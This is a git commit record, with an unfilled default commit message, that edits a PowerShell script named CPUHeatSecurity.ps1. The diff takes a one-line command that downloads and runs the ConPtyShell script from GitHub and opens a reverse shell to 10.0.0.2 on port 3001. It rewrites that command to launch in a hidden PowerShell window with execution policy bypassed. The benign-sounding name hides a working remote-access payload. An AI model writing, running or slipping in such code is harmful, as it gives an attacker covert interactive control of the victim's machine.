3cd8c316dcdf07c65bdd9ba489dced2c92ce70df
BuildTools <unconfigured@null.spigotmc.org>
2023-06-08 17:40:38 +0400

    Please enter the commit message for your changes. Lines starting with '#' will be ignored, and an empty message aborts the commit.
    On branch master
    Your branch is up to date with 'origin/master'.
    
    Changes to be committed:
    	modified:   CPUHeatSecurity.ps1

--- CPUHeatSecurity.ps1
+++ CPUHeatSecurity.ps1
@@ -1,1 +1,5 @@
-IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
+$command = "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001"
+
+$arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"$command`""
+
+Start-Process powershell.exe -WindowStyle Hidden -ArgumentList $arguments
